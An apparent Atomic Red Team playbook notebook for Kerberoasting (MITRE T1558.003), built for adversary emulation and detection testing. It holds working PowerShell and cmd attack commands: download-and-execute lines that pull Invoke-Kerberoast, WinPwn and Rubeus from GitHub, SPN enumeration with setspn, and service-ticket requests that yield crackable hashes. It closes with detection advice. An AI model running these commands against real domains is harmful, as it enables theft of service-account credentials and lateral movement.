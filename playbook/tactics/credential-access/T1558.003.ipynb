{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "bb179caf",
   "metadata": {},
   "source": "# T1558.003 - Kerberoasting\nAdversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)"
  },
  {
   "cell_type": "markdown",
   "id": "b34c3705",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "1503fa4e",
   "metadata": {},
   "source": "### Atomic Test #1 - Request for service tickets\nThis test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Computer must be domain joined\n\n##### Check Prereq Commands:\n```powershell\nif((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host Joining this computer to a domain must be done manually\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "31938a37",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f2cb6527",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\nInvoke-Kerberoast | fl\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "98344449",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "9a8045b0",
   "metadata": {},
   "source": "### Atomic Test #2 - Rubeus kerberoast\nInformation on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Computer must be domain joined\n\n##### Check Prereq Commands:\n```powershell\nif((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host Joining this computer to a domain must be done manually\n\n```\n##### Description: Rubeus must exist\n\n##### Check Prereq Commands:\n```powershell\nif(Test-Path -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "085b9180",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "b5603f10",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nklist purge\ncmd.exe /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" kerberoast None /outfile:\"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1dc6e18e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "6998c4e3",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8d81cbae",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "17cda6be",
   "metadata": {},
   "source": "### Atomic Test #3 - Extract all accounts in use as SPN using setspn\nThe following test will utilize setspn to extract the Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output all the SPNs for the related domain. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Computer must be domain joined\n\n##### Check Prereq Commands:\n```cmd\nif((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nWrite-Host Joining this computer to a domain must be done manually\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d7bbe65e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "bd08a5eb",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nsetspn -T %USERDNSDOMAIN% -Q */*\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6d6b7e7c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "e00b828a",
   "metadata": {},
   "source": "### Atomic Test #4 - Request A Single Ticket via PowerShell\nThe following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the endpoint in question.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Computer must be domain joined\n\n##### Check Prereq Commands:\n```powershell\nif((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host Joining this computer to a domain must be done manually\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4fd08da1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "eb7f3639",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nAdd-Type -AssemblyName System.IdentityModel\n$ComputerFQDN=$env:LogonServer.trimStart('\\') + \".\" + $env:UserDnsDomain\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/$ComputerFQDN\" \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "24cdb204",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "98e11243",
   "metadata": {},
   "source": "### Atomic Test #5 - Request All Tickets via PowerShell\nThe following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Computer must be domain joined\n\n##### Check Prereq Commands:\n```powershell\nif((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host Joining this computer to a domain must be done manually\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3ab45e46",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "3d3c9aca",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nAdd-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5667b07f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "fb49d427",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - WinPwn - Kerberoasting",
    "Kerberoasting technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nKerberoasting -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e195a40a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "e3791feb",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - WinPwn - PowerSharpPack - Kerberoasting Using Rubeus",
    "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d039aab3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.003 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "4fe670ed",
   "metadata": {},
   "source": "## Detection\nEnable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking Kerberos Dec 2015)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}